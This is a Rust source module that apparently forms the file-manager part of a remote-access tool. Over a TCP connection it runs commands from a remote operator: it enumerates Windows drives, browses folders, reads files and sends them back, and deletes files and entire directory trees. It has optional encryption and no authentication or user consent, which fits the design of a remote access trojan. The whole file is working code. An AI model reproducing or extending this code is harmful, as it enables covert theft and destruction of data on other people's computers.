use std::net::TcpStream;
use std::path::{PathBuf, Path};

use common::buffers::write_buffer;
use common::commands::{Command, File, FileData};

pub fn file_manager(write_stream: &mut TcpStream, current_path: &mut PathBuf, command: &str, path: &str, secret: &Option<Vec<u8>>) {
    match command {
        "AVAILABLE_DISKS" => list_available_disks(write_stream, secret),
        "PREVIOUS_DIR" => navigate_to_parent(write_stream, current_path, secret),
        "VIEW_DIR" => view_folder(write_stream, current_path, path, secret),
        "REMOVE_DIR" => remove_directory(write_stream, current_path, path, secret),
        "REMOVE_FILE" => remove_file(write_stream, current_path, path, secret),
        "DOWNLOAD_FILE" => download_file(write_stream, current_path, path, secret),
        _ => {}
    }
}

fn list_available_disks(write_stream: &mut TcpStream, secret: &Option<Vec<u8>>) {
    write_buffer(write_stream , Command::DisksResult(get_available_disks()), secret);
}

fn navigate_to_parent(write_stream: &mut TcpStream, current_path: &mut PathBuf, secret: &Option<Vec<u8>>) {
    if let Some(parent) = current_path.parent() {
        *current_path = parent.to_path_buf();
        list_directory_contents(write_stream, current_path, secret);
    } else {
        list_available_disks(write_stream, secret);
    }
    write_current_folder(write_stream, current_path, secret);
}

fn view_folder(write_stream: &mut TcpStream, current_path: &mut PathBuf, folder: &str, secret: &Option<Vec<u8>>) {
    current_path.push(folder);
    list_directory_contents(write_stream, current_path, secret);
    write_current_folder(write_stream, current_path, secret);
}

fn list_directory_contents(write_stream: &mut TcpStream, path: &Path, secret: &Option<Vec<u8>>) {
    if let Ok(entries) = path.read_dir() {
        let mut file_entries: Vec<File> = Vec::new();
        for entry in entries.filter_map(Result::ok) {
            match entry.file_type() {
                Ok(file_type) => {
                    let name = entry.file_name().to_string_lossy().to_string();
                    if file_type.is_dir() {
                        file_entries.push(File{file_type: "dir".to_string(), name: name.clone()});
                    } else if file_type.is_file() {
                        file_entries.push(File{file_type: "file".to_string(), name: name.clone()});
                    }
                },
                Err(e) => {
                    eprintln!("Failed to read file type: {}", e);
                }
            }
        }
        write_buffer(write_stream, Command::FileList(file_entries), secret);
    } else {
        eprintln!("Could not read directory: {}", path.display());
    }
}

fn remove_directory(write_stream: &mut TcpStream, current_path: &mut Path, directory: &str, secret: &Option<Vec<u8>>) {
    let dir_path = current_path.join(directory);
    if std::fs::remove_dir_all(dir_path).is_ok() {
        list_directory_contents(write_stream, current_path, secret);
    }
}

fn remove_file(write_stream: &mut TcpStream, current_path: &mut Path, file: &str, secret: &Option<Vec<u8>>) {
    println!("Removing file: {}", file);
    let file_path = current_path.join(file);
    if std::fs::remove_file(file_path).is_ok() {
        list_directory_contents(write_stream, current_path, secret);
    }
}

fn download_file(write_stream: &mut TcpStream, current_path: &Path, filename: &str, secret: &Option<Vec<u8>>) {
    let file_path = current_path.join(filename);
    if let Ok(data) = std::fs::read(&file_path) {
        write_buffer(write_stream, Command::DonwloadFileResult(FileData{name: filename.to_string(), data}), secret);
    } else {
        eprintln!("Failed to read file: {}", file_path.display());
    }
}

fn get_available_disks() -> Vec<String> {
    let arr = [
        "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R",
        "S", "T", "U", "V", "W", "X", "Y", "Z",
    ];
    let mut available: Vec<String> = Vec::new();
    for dr in arr {
        let str = format!("{}:\\", dr);
        if std::path::Path::new(str.as_str()).read_dir().is_ok() {
            let _ = &available.push(dr.to_string());
        }
    }

    available
}

fn write_current_folder(write_stream: &mut TcpStream, current_path: &Path, secret: &Option<Vec<u8>>) {
    write_buffer(write_stream, Command::CurrentFolder(current_path.to_string_lossy().to_string()), secret);
}